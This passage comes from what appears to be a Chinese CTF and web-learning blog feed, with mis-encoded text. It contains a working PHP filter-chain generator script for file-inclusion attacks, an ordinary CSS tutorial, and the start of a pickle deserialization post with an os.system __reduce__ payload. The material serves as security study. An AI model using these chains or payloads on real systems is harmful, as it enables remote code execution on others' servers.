    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,
    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,
    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,
    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,
    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,
    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,
    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,
    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,
    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,
    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,
    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,
    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,
    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,
    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,
    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,
    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,
    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,
    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,
    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,
    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,
    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,
    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,
    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,
    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,
    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,
    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span>
&#125;

<span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):

    encoded_chain = chain
    <span class="comment"># generate some garbage base64</span>
    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>
    filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>


    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:
        filters += conversions[c] + <span class="string">&quot;|&quot;</span>
        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span>
        filters += <span class="string">&quot;convert.base64-decode|&quot;</span>
        filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
        <span class="comment"># get rid of equal signs</span>
        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>
    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:
        <span class="comment"># don&#x27;t add the decode while debugging chains</span>
        filters += <span class="string">&quot;convert.base64-decode&quot;</span>

    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span>
    <span class="keyword">return</span> final_payload

<span class="keyword">def</span> <span class="title function_">main</span>():

    <span class="comment"># Parsing command line arguments</span>
    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)

    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)
    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)
    args = parser.parse_args()
    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)
        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        chain = generate_filter_chain(base64_value)
        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))
        <span class="built_in">print</span>(chain)
    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)
        <span class="keyword">if</span> (<span class="keyword">match</span>):
            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)
            <span class="built_in">print</span>(chain)
        <span class="keyword">else</span>:
            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)
            exit(<span class="number">1</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    main()
    
é“¾æ¥ï¼šhttps://err0r233.github.io/posts/<span class="number">28510.</span>html</code></pre>



<ul>
<li><p>UTF-8 -&gt;UTF-7</p>
<p>æµ‹è¯•ä»£ç </p>
</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="variable">$a</span>=<span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt&#x27;</span>;
<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;=&#x27;</span>);

<span class="comment">/**</span>
<span class="comment">Qftm.txt å†™å…¥çš„å†…å®¹ä¸º: +AD0-</span>
<span class="comment">**/</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250328104911141.png" alt="image-20250328104911141"></p>
<p>è¿™é‡Œç›´æ¥ç»™æŸä¸ªå¸ˆå‚…åšå®¢çš„æˆªå›¾ï¼Œè¿™æ˜¯åŸé“¾æ¥<a href="https://www.anquanke.com/post/id/202510#h3-15">æ¢ç´¢php:&#x2F;&#x2F;filteråœ¨å®æˆ˜å½“ä¸­çš„å¥‡æŠ€æ·«å·§-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a>ï¼Œæ‡’å¾—æ‰“äº†(ç˜«)</p>
<h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±åº¦å­¦ä¹ ç½‘é¡µå‰ç«¯ä¹‹CSS</title>
    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
    <content><![CDATA[<h1 id="æ·±åº¦å­¦ä¹ ç½‘é¡µå‰ç«¯ä¹‹CSS"><a href="#æ·±åº¦å­¦ä¹ ç½‘é¡µå‰ç«¯ä¹‹CSS" class="headerlink" title="æ·±åº¦å­¦ä¹ ç½‘é¡µå‰ç«¯ä¹‹CSS"></a>æ·±åº¦å­¦ä¹ ç½‘é¡µå‰ç«¯ä¹‹CSS</h1><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä½ å¦‚æœé—®æˆ‘CSSæ˜¯ä»€ä¹ˆ<del>CSSå°±æ˜¯CSSå•Š</del></p>
<p>é‚£æˆ‘å¯ä»¥è¯´ï¼Œå¹³æ—¶æµè§ˆç½‘é¡µçš„ä¸»è¦å†…å®¹å°±ç®—ç”±CSSæ„æˆçš„ï¼Œå¦‚æœè¯´HTMLæ˜¯éª¨æ¶ï¼Œé‚£ä¹ˆCSSå°±æ˜¯ä¸»è¦çš„è¡€è‚‰</p>
<p>çœ‹çœ‹èœé¸Ÿæ•™ç¨‹ä¸Šæ˜¯æ€ä¹ˆè§£é‡Šçš„:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
<h2 id="CSSåŸºç¡€è¯­æ³•"><a href="#CSSåŸºç¡€è¯­æ³•" class="headerlink" title="CSSåŸºç¡€è¯­æ³•"></a>CSSåŸºç¡€è¯­æ³•</h2><p>CSSç”±ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†æ„æˆ:</p>
<ul>
<li>é€‰æ‹©å™¨ &#x2F;&#x2F;éœ€è¦æ”¹å˜æ ·å¼çš„HTMLå…ƒç´ </li>
<li>ä¸€æ¡æˆ–å¤šæ¡è¯´æ˜ &#x2F;&#x2F;æ¯ç»™è¯´æ˜&#x3D;1ä¸ªå±æ€§+1ä¸ªå€¼</li>
</ul>
<p>æ¯ä¸ªå±æ€§æœ‰ä¸€ä¸ªå€¼ã€‚å±æ€§å’Œå€¼è¢«å†’å·åˆ†å¼€</p>
<p>ä¸€èˆ¬éƒ½æ”¾åœ¨headéƒ¨åˆ†çš„styleé‡Œ</p>
<p>å¤§æ¦‚é•¿è¿™ä¸ªæ ·å­</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
<p>cssçš„æ³¨é‡Šä½¿ç”¨ç»å…¸çš„&#x2F;* *&#x2F;</p>
<h2 id="å¯¹äºå¤šæ¨¡å—çš„å¤„ç†"><a href="#å¯¹äºå¤šæ¨¡å—çš„å¤„ç†" class="headerlink" title="å¯¹äºå¤šæ¨¡å—çš„å¤„ç†"></a>å¯¹äºå¤šæ¨¡å—çš„å¤„ç†</h2><p>ç”¨è¿‡F12çš„éƒ½çŸ¥é“ï¼Œä¸€ä¸ªæˆç†Ÿçš„ç½‘é¡µè¿œè¿œä¸æ­¢ä¸€ç§å•è°ƒçš„å…ƒç´ ï¼Œè€Œæ˜¯èƒ½è®©ä½ çœ¼èŠ±ç¼­ä¹±çš„ï¼Œè¿™å°±æ˜¯é€šè¿‡é€‰æ‹©å™¨æ¥è¿›è¡Œä¸åŒçš„æ¸²æŸ“çš„</p>
<h3 id="id-é€‰æ‹©å™¨"><a href="#id-é€‰æ‹©å™¨" class="headerlink" title="id é€‰æ‹©å™¨"></a>id é€‰æ‹©å™¨</h3><p>åœ¨{}å‰åŠ ä¸Š<code>#[é€‰æ‹©å™¨åå­—]</code></p>
<p>åœ¨ä¸‹é¢è¦ä½¿ç”¨è¿™äº›å±æ€§+å€¼çš„éƒ¨åˆ†çš„å¼€å§‹æ ‡ç­¾åŠ ä¸Š<code>id=&quot;[é€‰æ‹©å™¨åå­—]&quot;</code></p>
<p>è¿™æ ·å°±å¤§åŠŸå‘Šæˆäº†</p>
<blockquote>
<p>[!IMPORTANT]</p>
<p>IDå±æ€§ä¸è¦ä»¥æ•°å­—å¼€å¤´ï¼Œæ•°å­—å¼€å¤´çš„IDåœ¨ Mozilla&#x2F;Firefox æµè§ˆå™¨ä¸­ä¸èµ·ä½œç”¨</p>
</blockquote>
<h3 id="classé€‰æ‹©å™¨"><a href="#classé€‰æ‹©å™¨" class="headerlink" title="classé€‰æ‹©å™¨"></a>classé€‰æ‹©å™¨</h3><p>classé€‰æ‹©å™¨ç”¨äºæè¿°ä¸€ç»„å…ƒç´ çš„æ ·å¼ï¼Œä½¿ç”¨ç»å…¸æ¬¾å‰åé—­åˆ</p>
<p>headéƒ¨åˆ†:.</p>
<pre><code class="highlight css">.<span class="selector-attr">[é€‰æ‹©å™¨åå­—]</span>&#123;
å±æ€§ä¸å€¼
&#125;</code></pre>

<p>bodyéƒ¨åˆ†: </p>
<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[é€‰æ‹©å™¨åç§°]</span>&quot;&gt;

&lt;/<span class="selector-tag">div</span>&gt;</code></pre>

<h2 id="CSSçš„æ’å…¥"><a href="#CSSçš„æ’å…¥" class="headerlink" title="CSSçš„æ’å…¥"></a>CSSçš„æ’å…¥</h2><p>CSSçš„æ’å…¥æ–¹å¼æœ‰ä¸‰ç§</p>
<ul>
<li>å¤–éƒ¨æ ·å¼è¡¨</li>
<li>å†…éƒ¨æ ·å¼è¡¨</li>
<li>å†…è”æ ·å¼</li>
</ul>
<h3 id="å¤–éƒ¨æ ·å¼è¡¨"><a href="#å¤–éƒ¨æ ·å¼è¡¨" class="headerlink" title="å¤–éƒ¨æ ·å¼è¡¨"></a>å¤–éƒ¨æ ·å¼è¡¨</h3><p>å°±å’Œå›¾ç‰‡å·®ä¸å¤šï¼Œä»æœåŠ¡å™¨çš„ç›®å½•ä¸‹å¼•å…¥æ ·å¼è¡¨</p>
<pre><code class="highlight html"><span class="comment">&lt;!-- htmlå†… --&gt;</span>
<span class="tag">&lt;<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<pre><code class="highlight css"><span class="comment">/*CSSæ–‡ä»¶å†…*/</span>
hr &#123;<span class="attribute">color</span>:sienna;&#125;
<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>

<p>æµè§ˆå™¨ä¼šä»cssæ–‡ä»¶ä¸­è¯»å–æ ·å¼å£°æ˜ï¼Œå¹¶æ ¹æ®å£°æ˜æ¥æ ¼å¼æ–‡æ¡£</p>
<blockquote>
<p>ç”¨ä½œå¤–éƒ¨è¡¨çš„CSSæ–‡ä»¶ä¸èƒ½åŒ…å«ä»»ä½•çš„ html æ ‡ç­¾</p>
</blockquote>
<p>ä¸è¦å±æ€§å€¼å’Œå•ä½ä¹‹é—´ç•™ç©ºæ ¼:å¦‚ <code>margin-left: 20 px</code>åº”è¯¥å†™ä¸º<code>margin-left: 20px</code></p>
<h3 id="å†…éƒ¨æ ·å¼è¡¨"><a href="#å†…éƒ¨æ ·å¼è¡¨" class="headerlink" title="å†…éƒ¨æ ·å¼è¡¨"></a>å†…éƒ¨æ ·å¼è¡¨</h3><p>å•ä¸ªæ–‡æ¡£éœ€è¦ç‰¹æ®Šæ ·å¼æ—¶ï¼Œå°±ä½¿ç”¨å†…éƒ¨æ ·å¼è¡¨ï¼š</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<h3 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h3><p>ç”±äºè¦å°†è¡¨ç°å’Œå†…å®¹æ··æ‚åœ¨ä¸€èµ·ï¼Œå†…è”æ ·å¼ä¼šæŸå¤±æ‰æ ·å¼è¡¨çš„è®¸å¤šä¼˜åŠ¿ã€‚è¯·æ…ç”¨è¿™ç§æ–¹æ³•ï¼Œä¾‹å¦‚å½“æ ·å¼ä»…éœ€è¦åœ¨ä¸€ä¸ªå…ƒç´ ä¸Šåº”ç”¨ä¸€æ¬¡æ—¶ã€‚</p>
<p>è¦ä½¿ç”¨å†…è”æ ·å¼ï¼Œä½ éœ€è¦åœ¨ç›¸å…³çš„æ ‡ç­¾å†…ä½¿ç”¨æ ·å¼ï¼ˆstyleï¼‰å±æ€§ã€‚Style å±æ€§å¯ä»¥åŒ…å«ä»»ä½• CSS å±æ€§ã€‚æœ¬ä¾‹å±•ç¤ºå¦‚ä½•æ”¹å˜æ®µè½çš„é¢œè‰²å’Œå·¦å¤–è¾¹è·ï¼š</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<h3 id="æ ·å¼çš„ç»§æ‰¿"><a href="#æ ·å¼çš„ç»§æ‰¿" class="headerlink" title="æ ·å¼çš„ç»§æ‰¿"></a>æ ·å¼çš„ç»§æ‰¿</h3><p>å¦‚æœæŸäº›å±æ€§åœ¨ä¸åŒçš„æ ·å¼è¡¨ä¸­è¢«åŒæ ·çš„é€‰æ‹©å™¨å®šä¹‰ï¼Œé‚£ä¹ˆå±æ€§å€¼å°†ä»æ›´å…·ä½“çš„æ ·å¼è¡¨ä¸­è¢«ç»§æ‰¿è¿‡æ¥ã€‚ </p>
<p>ä¾‹å¦‚ï¼Œå¤–éƒ¨æ ·å¼è¡¨æ‹¥æœ‰é’ˆå¯¹ h3 é€‰æ‹©å™¨çš„ä¸‰ä¸ªå±æ€§ï¼š</p>
<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>

<p>è€Œå†…éƒ¨æ ·å¼è¡¨æ‹¥æœ‰é’ˆå¯¹ h3 é€‰æ‹©å™¨çš„ä¸¤ä¸ªå±æ€§ï¼š</p>
<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>

<p>å‡å¦‚æ‹¥æœ‰å†…éƒ¨æ ·å¼è¡¨çš„è¿™ä¸ªé¡µé¢åŒæ—¶ä¸å¤–éƒ¨æ ·å¼è¡¨é“¾æ¥ï¼Œé‚£ä¹ˆ h3 å¾—åˆ°çš„æ ·å¼æ˜¯ï¼š</p>
<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>

<p>å³é¢œè‰²å±æ€§å°†è¢«ç»§æ‰¿äºå¤–éƒ¨æ ·å¼è¡¨ï¼Œè€Œæ–‡å­—æ’åˆ—ï¼ˆtext-alignmentï¼‰å’Œå­—ä½“å°ºå¯¸ï¼ˆfont-sizeï¼‰ä¼šè¢«å†…éƒ¨æ ·å¼è¡¨ä¸­çš„è§„åˆ™å–ä»£ã€‚</p>
<hr>
<p>æ ·å¼çš„ä¼˜å…ˆçº§ä¸º:</p>
<p><strong>ï¼ˆå†…è”æ ·å¼ï¼‰Inline style &gt; ï¼ˆå†…éƒ¨æ ·å¼ï¼‰Internal style sheet &gt;ï¼ˆå¤–éƒ¨æ ·å¼ï¼‰External style sheet &gt; æµè§ˆå™¨é»˜è®¤æ ·å¼</strong></p>
<blockquote>
<p><strong>æ³¨æ„ï¼š</strong>å¦‚æœå¤–éƒ¨æ ·å¼æ”¾åœ¨å†…éƒ¨æ ·å¼çš„åé¢ï¼Œåˆ™å¤–éƒ¨æ ·å¼å°†è¦†ç›–å†…éƒ¨æ ·å¼</p>
</blockquote>
<h2 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
<li>é¡µé¢: body{background-color: }</li>
<li>æ­£æ–‡: p{background-color:}</li>
<li>æ ‡é¢˜: h1{background-color: }</li>
<li>æŒ‡å®šæ¨¡å—: div{background-color:}</li>
</ul>
<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>æè¿°äº†å…ƒç´ çš„èƒŒæ™¯å›¾åƒ</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>

]]></content>
      <tags>
        <tag>-Webå‰ç«¯ -CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>éšæ‰‹æ‰“çš„pickleååºåˆ—åŒ–</title>
    <url>/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Pickleååºåˆ—åŒ–çš„åˆ©ç”¨"><a href="#Pickleååºåˆ—åŒ–çš„åˆ©ç”¨" class="headerlink" title="Pickleååºåˆ—åŒ–çš„åˆ©ç”¨"></a>Pickleååºåˆ—åŒ–çš„åˆ©ç”¨</h1><h2 id="pickleæ˜¯ä»€ä¹ˆï¼Œèƒ½åƒå—"><a href="#pickleæ˜¯ä»€ä¹ˆï¼Œèƒ½åƒå—" class="headerlink" title="pickleæ˜¯ä»€ä¹ˆï¼Œèƒ½åƒå—"></a>pickleæ˜¯ä»€ä¹ˆï¼Œèƒ½åƒå—</h2><p>pickleè™½è¯´æ˜¯å’Œpythonæœ‰ç‚¹å…³ç³»ï¼Œä½†æ˜¯ä¸å¦‚è¯´å®ƒæ›´åƒä¸€é—¨å•ç‹¬çš„è¯­è¨€</p>
<p>æ—¢ç„¶è¦è®²ååºåˆ—åŒ–ï¼Œé‚£å°±å…ˆè®²è®²ç”¨äºååºåˆ—åŒ–çš„å‡½æ•°</p>
<pre><code class="highlight plaintext">pickle.dump()//åºåˆ—åŒ–
pickle.load()//ååºåˆ—åŒ–
pickle.dumps()
pickle.loads()</code></pre>

<p>å…ˆå†™ä¸ªå®ä¾‹æ¥å¤§è‡´äº†è§£ä¸€ä¸‹è¿™ä¸ªä¸œä¸œ</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	task=<span class="string">&#x27;ctf&#x27;</span>
	sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p>å¯ä»¥çœ‹åˆ°æ‰“å°å‡ºäº†è¿™æ ·ä¸€ä¸²<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513135736987.png" alt="image-20250513135736987"></p>
<p>ä½†æ˜¯ä»”ç»†ä¸€çœ‹ï¼Œä¸å¤ªå¯¹ï¼Œæˆ‘çš„114514æ€ä¹ˆè¢«åäº†</p>
<p>å‘ç°éœ€è¦å†™ä¸€ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œé‡æ–°å†™ä¸€ä¸‹</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513140625824.png" alt="image-20250513140625824"></p>
<p>çœŸä¸èµ–å§ã€‚ã€‚</p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥è¿™æ ·å†™</p>
<pre><code class="highlight python"><span class="keyword">import</span> os, pickle
<span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):
    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))
    
<span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))<span class="comment">#è¿™è¾¹protocolæ˜¯æ§åˆ¶åè®®ç‰ˆæœ¬çš„ï¼Œæˆ‘ä»¬æœ€å¸¸ç”¨çš„å³æ˜¯0çš„ç‰ˆæœ¬</span></code></pre>



<h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p><del>æ˜¯Plant VS Mambaå—</del></p>
<p>pickleæ˜¯ä¸€ç§æ ˆè¯­è¨€ï¼ŒåŸºäºä¸€ä¸ªè½»é‡çº§çš„PVM</p>
<p>PVMç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ:</p>
<pre><code class="highlight plaintext">æŒ‡ä»¤å¤„ç†å™¨
ä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚
æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚

stack
ç”± Python çš„ list å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚

memo
ç”± Python çš„ dict å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨</code></pre>

